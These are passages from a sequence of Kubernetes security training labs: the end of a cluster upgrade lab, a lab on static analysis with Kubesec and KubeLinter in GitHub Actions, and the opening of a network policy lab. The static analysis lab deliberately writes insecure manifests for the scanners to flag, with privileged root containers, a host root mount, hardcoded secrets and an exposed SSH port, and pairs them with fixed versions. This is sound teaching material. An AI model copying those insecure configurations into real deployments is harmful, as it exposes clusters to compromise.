kind: Service
metadata:
  name: nginx-test-service
  namespace: upgrade-test
spec:
  selector:
    app: nginx-test
  ports:
  - port: 80
    targetPort: 80
  type: ClusterIP
EOF

    Verify deployment:

kubectl get all -n upgrade-test
kubectl wait --for=condition=available --timeout=300s deployment/nginx-test -n upgrade-test

Subtask 5.3: Test Network Connectivity

    Test pod-to-pod communication:

# Get pod IPs
kubectl get pods -n upgrade-test -o wide

# Test connectivity between pods
kubectl exec -n upgrade-test deployment/nginx-test -- curl -s http://<another-pod-ip>

    Test service discovery:

# Test service resolution
kubectl run test-connectivity --image=busybox --rm -it --restart=Never -n upgrade-test -- wget -qO- http://nginx-test-service

    Test external connectivity:

kubectl run test-external --image=busybox --rm -it --restart=Never -- wget -qO- http://httpbin.org/ip

Subtask 5.4: Performance and Resource Verification

    Check resource usage:

kubectl top nodes
kubectl top pods -n kube-system

    Verify persistent volumes (if applicable):

kubectl get pv
kubectl get pvc --all-namespaces

    Test RBAC functionality:

# Create a test service account
kubectl create serviceaccount test-sa -n upgrade-test

# Test permissions
kubectl auth can-i get pods --as=system:serviceaccount:upgrade-test:test-sa -n upgrade-test

Task 6: Post-Upgrade Cleanup and Documentation
Subtask 6.1: Clean Up Test Resources

    Remove test applications:

kubectl delete namespace upgrade-test
kubectl delete pod test-dns --ignore-not-found
kubectl delete pod test-connectivity --ignore-not-found
kubectl delete pod test-external --ignore-not-found

    Clean up temporary files:

rm -f cluster-info-before-upgrade.txt
rm -f nodes-before-upgrade.yaml

Subtask 6.2: Document Upgrade Results

    Generate post-upgrade cluster information:

# Document final cluster state
kubectl cluster-info > cluster-info-after-upgrade.txt
kubectl get nodes -o yaml > nodes-after-upgrade.yaml
kubectl version --short > version-after-upgrade.txt

    Create upgrade summary:

cat << EOF > upgrade-summary.txt
Kubernetes Cluster Upgrade Summary
==================================
Date: $(date)
Upgrade performed by: $(whoami)

Pre-upgrade version: [Document from initial check]
Post-upgrade version: $(kubectl version --short | grep Server)

Nodes upgraded:
$(kubectl get nodes)

Critical components verified:
- etcd: Healthy
- CoreDNS: Running
- kube-proxy: Running
- Container runtime: Updated

Tests performed:
- DNS resolution: PASSED
- Pod deployment: PASSED
- Service connectivity: PASSED
- External connectivity: PASSED

Backup location: /opt/etcd-backup/
Configuration backup: /opt/kubernetes-config-backup-*
EOF

Troubleshooting Common Issues
Issue 1: Node Fails to Upgrade

Symptoms: Node remains in NotReady state after upgrade

Solution:

# Check kubelet logs
sudo journalctl -u kubelet -f

# Restart kubelet service
sudo systemctl restart kubelet

# Check node conditions
kubectl describe node <node-name>

Issue 2: Pods Stuck in Pending State

Symptoms: Pods cannot be scheduled after upgrade

Solution:

# Check node taints
kubectl describe nodes | grep Taints

# Remove upgrade taints if present
kubectl taint nodes <node-name> node.kubernetes.io/unschedulable-

# Check resource availability
kubectl describe nodes | grep -A 5 "Allocated resources"

Issue 3: DNS Resolution Failures

Symptoms: Pods cannot resolve service names

Solution:

# Check CoreDNS pods
kubectl get pods -n kube-system -l k8s-app=kube-dns

# Restart CoreDNS
kubectl rollout restart deployment/coredns -n kube-system

# Verify DNS configuration
kubectl get configmap coredns -n kube-system -o yaml

Security Best Practices
During Upgrades

• Always backup etcd before starting any upgrade process • Test upgrades in staging environment first • Maintain node cordoning during individual node upgrades • Monitor security advisories for Kubernetes components • Verify RBAC policies remain intact after upgrades
Post-Upgrade Security Checks

# Check for deprecated API usage
kubectl get events --all-namespaces | grep -i deprecated

# Verify security policies
kubectl get networkpolicies --all-namespaces
kubectl get podsecuritypolicies

# Check for security updates
kubectl get nodes -o json | jq '.items[].status.nodeInfo'

Conclusion

In this comprehensive lab, you have successfully:

• Performed a complete Kubernetes cluster upgrade using kubeadm, ensuring minimal downtime and maintaining cluster functionality • Applied security patches to both Kubernetes components and underlying system packages • Implemented proper backup procedures to protect against upgrade failures • Validated cluster functionality through comprehensive testing of networking, DNS, and application deployment • Learned troubleshooting techniques for common upgrade issues

Why This Matters: Keeping Kubernetes clusters up-to-date is critical for security, stability, and access to new features. The skills you've developed in this lab are essential for maintaining production Kubernetes environments, ensuring they remain secure against vulnerabilities while providing reliable service to applications and users.

The upgrade and patch management processes you've mastered are fundamental responsibilities for Kubernetes administrators and are crucial knowledge areas for the Certified Kubernetes Security Specialist (CKS) certification. Regular maintenance of Kubernetes clusters helps prevent security breaches, ensures optimal performance, and maintains compliance with organizational security policies.

Remember to always test upgrade procedures in non-production environments first, maintain regular backup schedules, and stay informed about security advisories affecting your Kubernetes infrastructure.




Lab 19: Static Analysis in CI/CD Pipelines
Objectives

By the end of this lab, you will be able to:

• Configure a CI/CD pipeline using GitHub Actions to integrate static analysis tools • Implement Kubesec for Kubernetes security analysis in automated workflows • Deploy KubeLinter to detect configuration issues and security vulnerabilities • Set up automated scanning for container images from trusted registries • Identify and remediate common Kubernetes misconfigurations • Create security gates in CI/CD pipelines to prevent insecure deployments • Understand the importance of shift-left security practices in DevSecOps
Prerequisites

Before starting this lab, you should have:

• Basic understanding of Kubernetes concepts (pods, deployments, services) • Familiarity with YAML syntax and Kubernetes manifest files • Basic knowledge of Git and GitHub workflows • Understanding of CI/CD pipeline concepts • Experience with command-line interface operations • Basic Docker and container concepts
Lab Environment Setup

Ready-to-Use Cloud Machines: Al Nafi provides Linux-based cloud machines with all necessary tools pre-installed. Simply click Start Lab to access your environment. No need to build your own VM or install additional software.

Your lab environment includes: • Ubuntu 20.04 LTS with Docker pre-installed • kubectl configured and ready to use • Git client configured • Access to create GitHub repositories • All required static analysis tools
Task 1: Environment Preparation and Tool Installation
Subtask 1.1: Verify Lab Environment

First, let's verify that our lab environment is properly configured.

# Check Docker installation
docker --version

# Check kubectl installation
kubectl version --client

# Check Git configuration
git --version

# Verify system resources
free -h
df -h

Subtask 1.2: Install Static Analysis Tools

Install Kubesec and KubeLinter on your local environment.

# Install Kubesec
curl -sSX GET https://api.github.com/repos/controlplaneio/kubesec/releases/latest \
  | grep browser_download_url \
  | grep linux \
  | cut -d '"' -f 4 \
  | wget -O kubesec -i -

chmod +x kubesec
sudo mv kubesec /usr/local/bin/

# Verify Kubesec installation
kubesec version

# Install KubeLinter
curl -L https://github.com/stackrox/kube-linter/releases/latest/download/kube-linter-linux.tar.gz \
  | tar xz

sudo mv kube-linter /usr/local/bin/

# Verify KubeLinter installation
kube-linter version

Subtask 1.3: Create Project Directory Structure

Set up the project directory structure for our lab.

# Create main project directory
mkdir -p ~/static-analysis-lab
cd ~/static-analysis-lab

# Create subdirectories
mkdir -p {manifests,scripts,.github/workflows,reports}

# Create initial files
touch README.md
touch .gitignore

# Set up .gitignore
cat > .gitignore << 'EOF'
# Reports and logs
reports/*.json
reports/*.html
*.log

# Temporary files
*.tmp
.DS_Store

# IDE files
.vscode/
.idea/
EOF

Task 2: Create Sample Kubernetes Manifests with Security Issues
Subtask 2.1: Create Insecure Pod Manifest

Create a deliberately insecure pod manifest to demonstrate static analysis capabilities.

# Create an insecure pod manifest
cat > manifests/insecure-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: insecure-app
  labels:
    app: insecure-app
spec:
  containers:
  - name: app-container
    image: nginx:latest
    ports:
    - containerPort: 80
    securityContext:
      privileged: true
      runAsUser: 0
    env:
    - name: SECRET_KEY
      value: "hardcoded-secret-123"
    resources: {}
EOF

Subtask 2.2: Create Insecure Deployment Manifest

Create a deployment with multiple security vulnerabilities.

# Create an insecure deployment manifest
cat > manifests/insecure-deployment.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-app
  labels:
    app: vulnerable-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: vulnerable-app
  template:
    metadata:
      labels:
        app: vulnerable-app
    spec:
      containers:
      - name: web-server
        image: nginx:1.14
        ports:
        - containerPort: 80
        securityContext:
          allowPrivilegeEscalation: true
          readOnlyRootFilesystem: false
        env:
        - name: DB_PASSWORD
          value: "admin123"
        - name: API_KEY
          value: "sk-1234567890abcdef"
        volumeMounts:
        - name: host-volume
          mountPath: /host
      volumes:
      - name: host-volume
        hostPath:
          path: /
          type: Directory
      serviceAccountName: default
EOF

Subtask 2.3: Create Service with Security Issues

Create a service manifest with potential security concerns.

# Create a service manifest
cat > manifests/insecure-service.yaml << 'EOF'
apiVersion: v1
kind: Service
metadata:
  name: vulnerable-service
spec:
  type: NodePort
  ports:
  - port: 80
    targetPort: 80
    nodePort: 30080
  selector:
    app: vulnerable-app
---
apiVersion: v1
kind: Service
metadata:
  name: admin-service
spec:
  type: LoadBalancer
  ports:
  - port: 22
    targetPort: 22
    protocol: TCP
  selector:
    app: admin-app
EOF

Task 3: Configure Static Analysis Tools
Subtask 3.1: Test Kubesec Analysis

Run Kubesec analysis on our insecure manifests to understand the tool's capabilities.

# Analyze the insecure pod
kubesec scan manifests/insecure-pod.yaml

# Analyze the insecure deployment
kubesec scan manifests/insecure-deployment.yaml

# Generate JSON report for the pod
kubesec scan manifests/insecure-pod.yaml > reports/kubesec-pod-report.json

# Generate JSON report for the deployment
kubesec scan manifests/insecure-deployment.yaml > reports/kubesec-deployment-report.json

Subtask 3.2: Configure KubeLinter Analysis

Create a KubeLinter configuration file and run analysis.

# Create KubeLinter configuration
cat > .kube-linter.yaml << 'EOF'
checks:
  # Enable all default checks
  addAllBuiltIn: true
  
  # Disable specific checks if needed (example)
  exclude:
    - "dangling-service"
  
  # Include additional checks
  include:
    - "privileged-ports"
    - "ssh-port"
    - "unsafe-sysctls"

# Custom check configurations
customChecks: []

# Ignore specific files or patterns
ignore:
  - "kustomization.yaml"
EOF

# Run KubeLinter on all manifests
kube-linter lint manifests/

# Generate detailed report
kube-linter lint manifests/ --format json > reports/kube-linter-report.json

# Generate human-readable report
kube-linter lint manifests/ --format plain > reports/kube-linter-report.txt

Subtask 3.3: Create Analysis Scripts

Create reusable scripts for static analysis.

# Create comprehensive analysis script
cat > scripts/run-static-analysis.sh << 'EOF'
#!/bin/bash

set -e

echo "=== Starting Static Analysis ==="
echo "Timestamp: $(date)"

# Create reports directory if it doesn't exist
mkdir -p reports

# Run Kubesec analysis
echo "Running Kubesec analysis..."
for file in manifests/*.yaml; do
    if [ -f "$file" ]; then
        filename=$(basename "$file" .yaml)
        echo "Analyzing $file..."
        kubesec scan "$file" > "reports/kubesec-${filename}-report.json"
        
        # Extract score for summary
        score=$(jq -r '.[0].score // "N/A"' "reports/kubesec-${filename}-report.json")
        echo "  Score: $score"
    fi
done

# Run KubeLinter analysis
echo "Running KubeLinter analysis..."
kube-linter lint manifests/ --format json > reports/kube-linter-full-report.json
kube-linter lint manifests/ --format plain > reports/kube-linter-summary.txt

# Generate summary report
echo "Generating summary report..."
cat > reports/analysis-summary.md << 'SUMMARY'
# Static Analysis Summary

## Analysis Date
$(date)

## Files Analyzed
$(find manifests/ -name "*.yaml" | wc -l) YAML files

## Kubesec Results
$(for file in reports/kubesec-*-report.json; do
    if [ -f "$file" ]; then
        filename=$(basename "$file" -report.json | sed 's/kubesec-//')
        score=$(jq -r '.[0].score // "N/A"' "$file")
        echo "- $filename: Score $score"
    fi
done)

## KubeLinter Issues
$(jq -r '.Reports | length' reports/kube-linter-full-report.json) total issues found

## Critical Issues
$(jq -r '.Reports[] | select(.Level == "error") | .Check' reports/kube-linter-full-report.json | sort | uniq -c | sort -nr)

SUMMARY

echo "=== Static Analysis Complete ==="
echo "Reports generated in ./reports/ directory"
EOF

# Make script executable
chmod +x scripts/run-static-analysis.sh

# Run the analysis script
./scripts/run-static-analysis.sh

Task 4: Set Up GitHub Repository and CI/CD Pipeline
Subtask 4.1: Initialize Git Repository

Set up a Git repository for our project.

# Initialize Git repository
git init

# Add all files
git add .

# Create initial commit
git commit -m "Initial commit: Add insecure Kubernetes manifests and analysis tools"

# Create a GitHub repository (you'll need to do this manually on GitHub.com)
echo "Please create a new repository on GitHub.com named 'k8s-static-analysis-lab'"
echo "Then run the following commands with your repository URL:"
echo "git remote add origin https://github.com/YOUR_USERNAME/k8s-static-analysis-lab.git"
echo "git branch -M main"
echo "git push -u origin main"

Subtask 4.2: Create GitHub Actions Workflow

Create a comprehensive CI/CD pipeline with static analysis integration.

# Create GitHub Actions workflow
cat > .github/workflows/static-analysis.yml << 'EOF'
name: Kubernetes Static Analysis

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
  schedule:
    # Run daily at 2 AM UTC
    - cron: '0 2 * * *'

jobs:
  static-analysis:
    name: Static Security Analysis
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout Code
      uses: actions/checkout@v4
      
    - name: Set up Docker
      uses: docker/setup-buildx-action@v3
      
    - name: Install Kubesec
      run: |
        curl -sSX GET https://api.github.com/repos/controlplaneio/kubesec/releases/latest \
          | grep browser_download_url \
          | grep linux \
          | cut -d '"' -f 4 \
          | wget -O kubesec -i -
        chmod +x kubesec
        sudo mv kubesec /usr/local/bin/
        kubesec version
        
    - name: Install KubeLinter
      run: |
        curl -L https://github.com/stackrox/kube-linter/releases/latest/download/kube-linter-linux.tar.gz \
          | tar xz
        sudo mv kube-linter /usr/local/bin/
        kube-linter version
        
    - name: Create Reports Directory
      run: mkdir -p reports
      
    - name: Run Kubesec Analysis
      run: |
        echo "Running Kubesec analysis..."
        for file in manifests/*.yaml; do
          if [ -f "$file" ]; then
            filename=$(basename "$file" .yaml)
            echo "Analyzing $file..."
            kubesec scan "$file" > "reports/kubesec-${filename}-report.json"
            
            # Check if score is below threshold
            score=$(jq -r '.[0].score // 0' "reports/kubesec-${filename}-report.json")
            echo "File: $file, Score: $score"
            
            if [ "$score" -lt 0 ]; then
              echo "::error::Security score for $file is $score (below threshold of 0)"
              echo "KUBESEC_FAILED=true" >> $GITHUB_ENV
            fi
          fi
        done
        
    - name: Run KubeLinter Analysis
      run: |
        echo "Running KubeLinter analysis..."
        kube-linter lint manifests/ --format json > reports/kube-linter-report.json || true
        kube-linter lint manifests/ --format plain > reports/kube-linter-summary.txt || true
        
        # Check for critical issues
        critical_count=$(jq -r '.Reports[] | select(.Level == "error") | .Check' reports/kube-linter-report.json | wc -l)
        echo "Critical issues found: $critical_count"
        
        if [ "$critical_count" -gt 0 ]; then
          echo "::error::Found $critical_count critical security issues"
          echo "KUBELINTER_FAILED=true" >> $GITHUB_ENV
        fi
        
    - name: Image Security Scan
      run: |
        echo "Scanning container images for vulnerabilities..."
        
        # Extract images from manifests
        images=$(grep -h "image:" manifests/*.yaml | sed 's/.*image: *//' | sort | uniq)
        
        for image in $images; do
          echo "Checking image: $image"
          
          # Check if image is from trusted registry
          if [[ "$image" == *"docker.io"* ]] || [[ "$image" != *"/"* ]]; then
            echo "::warning::Image $image may not be from a trusted registry"
          fi
          
          # Check for latest tag usage
          if [[ "$image" == *":latest" ]] || [[ "$image" != *":"* ]]; then
            echo "::error::Image $image uses 'latest' tag or no tag specified"
            echo "IMAGE_TAG_FAILED=true" >> $GITHUB_ENV
          fi
          
          # Basic image pull test
          docker pull "$image" || echo "::warning::Failed to pull image $image"
        done
        
    - name: Generate Security Report
      run: |
        cat > reports/security-summary.md << 'EOF'
        # Security Analysis Report
        
        **Analysis Date:** $(date)
        **Repository:** ${{ github.repository }}
        **Commit:** ${{ github.sha }}
        
        ## Kubesec Results
        $(for file in reports/kubesec-*-report.json; do
          if [ -f "$file" ]; then
            filename=$(basename "$file" -report.json | sed 's/kubesec-//')
            score=$(jq -r '.[0].score // "N/A"' "$file")
            echo "- **$filename**: Score $score"
          fi
        done)
        
        ## KubeLinter Issues
        **Total Issues:** $(jq -r '.Reports | length' reports/kube-linter-report.json)
        
        ### Critical Issues
        $(jq -r '.Reports[] | select(.Level == "error") | "- " + .Check + ": " + .Message' reports/kube-linter-report.json)
        
        ### Warnings
        $(jq -r '.Reports[] | select(.Level == "warning") | "- " + .Check + ": " + .Message' reports/kube-linter-report.json | head -10)
        
        ## Recommendations
        1. Fix all critical security issues before deployment
        2. Use specific image tags instead of 'latest'
        3. Implement proper RBAC and security contexts
        4. Remove hardcoded secrets from manifests
        5. Enable security scanning in your deployment pipeline
        EOF
        
    - name: Upload Analysis Reports
      uses: actions/upload-artifact@v4
      with:
        name: security-analysis-reports
        path: reports/
        retention-days: 30
        
    - name: Comment PR with Results
      if: github.event_name == 'pull_request'
      uses: actions/github-script@v7
      with:
        script: |
          const fs = require('fs');
          const path = 'reports/security-summary.md';
          
          if (fs.existsSync(path)) {
            const report = fs.readFileSync(path, 'utf8');
            
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: `## 🔒 Security Analysis Results\n\n${report}`
            });
          }
          
    - name: Fail on Security Issues
      run: |
        if [ "$KUBESEC_FAILED" = "true" ] || [ "$KUBELINTER_FAILED" = "true" ] || [ "$IMAGE_TAG_FAILED" = "true" ]; then
          echo "::error::Security analysis failed. Please fix the issues before proceeding."
          exit 1
        fi
        echo "✅ All security checks passed!"
EOF

Subtask 4.3: Create Additional Workflow for Secure Manifests

Create a workflow that demonstrates proper security practices.

# Create secure manifests for comparison
mkdir -p manifests/secure

# Create secure pod manifest
cat > manifests/secure/secure-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  labels:
    app: secure-app
  annotations:
    seccomp.security.alpha.kubernetes.io/pod: runtime/default
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app-container
    image: nginx:1.21.6-alpine
    ports:
    - containerPort: 8080
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      runAsNonRoot: true
      runAsUser: 1000
      capabilities:
        drop:
        - ALL
        add:
        - NET_BIND_SERVICE
    env:
    - name: SECRET_KEY
      valueFrom:
        secretKeyRef:
          name: app-secrets
          key: secret-key
    resources:
      limits:
        cpu: 500m
        memory: 512Mi
      requests:
        cpu: 100m
        memory: 128Mi
    livenessProbe:
      httpGet:
        path: /health
        port: 8080
      initialDelaySeconds: 30
      periodSeconds: 10
    readinessProbe:
      httpGet:
        path: /ready
        port: 8080
      initialDelaySeconds: 5
      periodSeconds: 5
    volumeMounts:
    - name: tmp-volume
      mountPath: /tmp
    - name: cache-volume
      mountPath: /var/cache/nginx
  volumes:
  - name: tmp-volume
    emptyDir: {}
  - name: cache-volume
    emptyDir: {}
  serviceAccountName: secure-app-sa
EOF

# Create secure deployment
cat > manifests/secure/secure-deployment.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-app
  labels:
    app: secure-app
    version: v1.0.0
spec:
  replicas: 3
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 1
  selector:
    matchLabels:
      app: secure-app
  template:
    metadata:
      labels:
        app: secure-app
        version: v1.0.0
      annotations:
        seccomp.security.alpha.kubernetes.io/pod: runtime/default
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        fsGroup: 2000
        seccompProfile:
          type: RuntimeDefault
      containers:
      - name: web-server
        image: nginx:1.21.6-alpine
        ports:
        - containerPort: 8080
          name: http
          protocol: TCP
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          runAsNonRoot: true
          runAsUser: 1000
          capabilities:
            drop:
            - ALL
            add:
            - NET_BIND_SERVICE
        env:
        - name: DB_PASSWORD
          valueFrom:
            secretKeyRef:
              name: db-secrets
              key: password
        - name: API_KEY
          valueFrom:
            secretKeyRef:
              name: api-secrets
              key: api-key
        resources:
          limits:
            cpu: 500m
            memory: 512Mi
          requests:
            cpu: 100m
            memory: 128Mi
        livenessProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /ready
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 5
        volumeMounts:
        - name: tmp-volume
          mountPath: /tmp
        - name: cache-volume
          mountPath: /var/cache/nginx
      volumes:
      - name: tmp-volume
        emptyDir: {}
      - name: cache-volume
        emptyDir: {}
      serviceAccountName: secure-app-sa
      automountServiceAccountToken: false
EOF

# Create network policy
cat > manifests/secure/network-policy.yaml << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: secure-app-netpol
spec:
  podSelector:
    matchLabels:
      app: secure-app
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: database
    ports:
    - protocol: TCP
      port: 5432
  - to: []
    ports:
    - protocol: TCP
      port: 53
    - protocol: UDP
      port: 53
EOF

Task 5: Test CI/CD Pipeline and Fix Security Issues
Subtask 5.1: Commit and Push Changes

Push all changes to trigger the CI/CD pipeline.

# Add all new files
git add .

# Commit changes
git commit -m "Add GitHub Actions workflow for static analysis and secure manifests"

# Push to trigger pipeline (replace with your repository URL)
git push origin main

Subtask 5.2: Monitor Pipeline Execution

Check the GitHub Actions workflow execution and analyze results.

# Create a script to check pipeline status
cat > scripts/check-pipeline-status.sh << 'EOF'
#!/bin/bash

echo "=== Pipeline Status Check ==="
echo "Please check your GitHub repository's Actions tab to monitor the pipeline execution."
echo ""
echo "Expected pipeline stages:"
echo "1. ✅ Checkout Code"
echo "2. ✅ Install Kubesec"
echo "3. ✅ Install KubeLinter"
echo "4. ❌ Run Kubesec Analysis (expected to fail)"
echo "5. ❌ Run KubeLinter Analysis (expected to fail)"
echo "6. ❌ Image Security Scan (expected to fail)"
echo "7. ✅ Generate Security Report"
echo "8. ✅ Upload Analysis Reports"
echo "9. ❌ Fail on Security Issues (expected to fail)"
echo ""
echo "The pipeline should fail due to security issues in the insecure manifests."
echo "This is expected behavior for this lab."
EOF

chmod +x scripts/check-pipeline-status.sh
./scripts/check-pipeline-status.sh

Subtask 5.3: Analyze Security Reports

Download and analyze the security reports generated by the pipeline.

# Create script to analyze local reports
cat > scripts/analyze-reports.sh << 'EOF'
#!/bin/bash

echo "=== Security Report Analysis ==="

if [ ! -d "reports" ]; then
    echo "Reports directory not found. Running local analysis..."
    ./scripts/run-static-analysis.sh
fi

echo ""
echo "=== Kubesec Analysis Results ==="
for file in reports/kubesec-*-report.json; do
    if [ -f "$file" ]; then
        filename=$(basename "$file" -report.json | sed 's/kubesec-//')
        score=$(jq -r '.[0].score // "N/A"' "$file")
        echo "File: $filename"
        echo "Score: $score"
        
        # Show critical issues
        echo "Critical Issues:"
        jq -r '.[0].scoring.critical[]?.reason // "None"' "$file" | sed 's/^/  - /'
        
        # Show advise
        echo "Recommendations:"
        jq -r '.[0].scoring.advise[]?.reason // "None"' "$file" | sed 's/^/  - /' | head -3
        echo ""
    fi
done

echo "=== KubeLinter Analysis Results ==="
if [ -f "reports/kube-linter-report.json" ]; then
    total_issues=$(jq -r '.Reports | length' reports/kube-linter-report.json)
    echo "Total Issues: $total_issues"
    
    echo ""
    echo "Critical Issues:"
    jq -r '.Reports[] | select(.Level == "error") | "  - " + .Check + ": " + .Message' reports/kube-linter-report.json
    
    echo ""
    echo "Top Warnings:"
    jq -r '.Reports[] | select(.Level == "warning") | "  - " + .Check + ": " + .Message' reports/kube-linter-report.json | head -5
fi

echo ""
echo "=== Security Score Summary ==="
echo "Files with negative Kubesec scores need immediate attention."
echo "KubeLinter critical issues must be resolved before deployment."
echo "Review the full reports in the ./reports/ directory for detailed remediation steps."
EOF

chmod +x scripts/analyze-reports.sh
./scripts/analyze-reports.sh

Subtask 5.4: Create Fixed Manifests

Create corrected versions of the insecure manifests.

# Create fixed pod manifest
cat > manifests/fixed-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  labels:
    app: secure-app
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
  containers:
  - name: app-container
    image: nginx:1.21.6-alpine
    ports:
    - containerPort: 8080
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      runAsNonRoot: true
      runAsUser: 1000
      capabilities:
        drop:
        - ALL
    env:
    - name: SECRET_KEY
      valueFrom:
        secretKeyRef:
          name: app-secrets
          key: secret-key
    resources:
      limits:
        cpu: 500m
        memory: 512Mi
      requests:
        cpu: 100m
        memory: 128Mi
    volumeMounts:
    - name: tmp-volume
      mountPath: /tmp
  volumes:
  - name: tmp-volume
    emptyDir: {}
EOF

# Create fixed deployment manifest
cat > manifests/fixed-deployment.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-app
  labels:
    app: secure-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: secure-app
  template:
    metadata:
      labels:
        app: secure-app
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        fsGroup: 2000
      containers:
      - name: web-server
        image: nginx:1.21.6-alpine
        ports:
        - containerPort: 8080
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          runAsNonRoot: true
          runAsUser: 1000
          capabilities:
            drop:
            - ALL
        env:
        - name: DB_PASSWORD
          valueFrom:
            secretKeyRef:
              name: db-secrets
              key: password
        - name: API_KEY
          valueFrom:
            secretKeyRef:
              name: api-secrets
              key: api-key
        resources:
          limits:
            cpu: 500m
            memory: 512Mi
          requests:
            cpu: 100m
            memory: 128Mi
        volumeMounts:
        - name: tmp-volume
          mountPath: /tmp
      volumes:
      - name: tmp-volume
        emptyDir: {}
      serviceAccountName: secure-app-sa
EOF

# Test the fixed manifests
echo "Testing fixed manifests..."
kubesec scan manifests/fixed-pod.yaml
kubesec scan manifests/fixed-deployment.yaml

kube-linter lint manifests/fixed-pod.yaml
kube-linter lint manifests/fixed-deployment.yaml

Task 6: Implement Trusted Registry Validation
Subtask 6.1: Create Registry Validation Script

Create a script to validate container images against trusted registries.

# Create registry validation script
cat > scripts/validate-registries.sh << 'EOF'
#!/bin/bash

set -e

# Define trusted registries
TRUSTED_REGISTRIES=(
    "gcr.io"
    "registry.k8s.io"
    "quay.io"
    "your-company-registry.com"
)

# Define allowed base images
ALLOWED_BASE_IMAGES=(
    "alpine"
    "ubuntu"
    "debian"
    "nginx"
    "redis"
)

echo "=== Container Image Registry Validation ==="

# Function to check if registry is trusted
is_trusted_registry() {
    local image=$1
    local registry=""
    
    # Extract registry from image name
    if [[ "$image" == *"/"* ]]; then
        registry=$(echo "$image" | cut -d'/' -f1)
    else
        registry="docker.io"  # Default registry
    fi
    
    for trusted in "${TRUSTED_REGISTRIES[@]}"; do
        if [[ "$registry" == "$trusted" ]]; then
            return 0
        fi
    done
    
    return 1
}

# Function to check image tag
check_image_tag() {
    local image=$1
    
    if [[ "$image" == *":latest" ]] || [[ "$image" != *":"* ]]; then
        echo "❌ Image $image uses 'latest' tag or no tag specified"
        return 






Lab 20: Advanced Network Security Lab
Objectives

By the end of this lab, students will be able to:

• Deploy and configure Kubernetes Network Policies to control traffic flow between pods and namespaces • Implement monitoring solutions using open-source tools to track network traffic and detect security anomalies • Simulate realistic network attacks against Kubernetes clusters • Validate the effectiveness of security policies through controlled testing • Analyze network traffic patterns to identify potential security threats • Configure advanced network security controls in containerized environments
Prerequisites

Before starting this lab, students should have:

• Basic understanding of Kubernetes concepts (pods, services, namespaces) • Familiarity with Linux command line operations • Basic networking knowledge (TCP/IP, ports, protocols) • Understanding of YAML configuration files • Knowledge of container security fundamentals
Lab Environment Setup

Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with all necessary tools installed. Simply click Start Lab to access your environment - no need to build your own VM or install software.

Your lab environment includes: • Kubernetes cluster (minikube) • kubectl command-line tool • Wireshark for network analysis • Falco for runtime security monitoring • Calico for network policy enforcement • Various penetration testing tools
Task 1: Deploy and Test Network Policies to Restrict Traffic Flow
Subtask 1.1: Set Up the Lab Environment

First, let's verify our Kubernetes cluster is running and create the necessary namespaces for our security testing.

# Check cluster status
kubectl cluster-info

# Create namespaces for our lab
kubectl create namespace frontend
kubectl create namespace backend
kubectl create namespace database
kubectl create namespace monitoring

# Label namespaces for policy targeting
kubectl label namespace frontend tier=frontend
kubectl label namespace backend tier=backend
kubectl label namespace database tier=database
kubectl label namespace monitoring tier=monitoring

Subtask 1.2: Deploy Sample Applications

Create test applications in different namespaces to simulate a multi-tier architecture.

# Create frontend application
cat << EOF | kubectl apply -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: frontend-app
  namespace: frontend
spec:
  replicas: 2
  selector:
    matchLabels:
      app: frontend
  template:
    metadata:
      labels:
        app: frontend
        tier: frontend
    spec:
      containers:
      - name: nginx
        image: nginx:latest
        ports:
        - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: frontend-service
  namespace: frontend
spec:
  selector:
    app: frontend
  ports:
  - port: 80
    targetPort: 80
  type: ClusterIP
EOF

# Create backend application
cat << EOF | kubectl apply -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: backend-app
  namespace: backend
spec:
  replicas: 2
  selector:
    matchLabels:
      app: backend
  template:
    metadata:
      labels:
        app: backend
        tier: backend
    spec:
      containers:
      - name: backend
        image: httpd:latest
        ports:
        - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: backend-service
  namespace: backend
spec:
  selector:
    app: backend
  ports:
  - port: 80
    targetPort: 80
  type: ClusterIP
EOF

# Create database application
cat << EOF | kubectl apply -f -
apiVersion: apps/v1
kind: Deployment
metadata:
  name: database-app
  namespace: database
spec:
  replicas: 1
  selector:
    matchLabels:
      app: database
  template:
    metadata:
      labels:
        app: database
        tier: database
    spec:
      containers:
      - name: mysql
        image: mysql:8.0
        env:
        - name: MYSQL_ROOT_PASSWORD
          value: "securepassword123"
        ports:
        - containerPort: 3306
---
apiVersion: v1
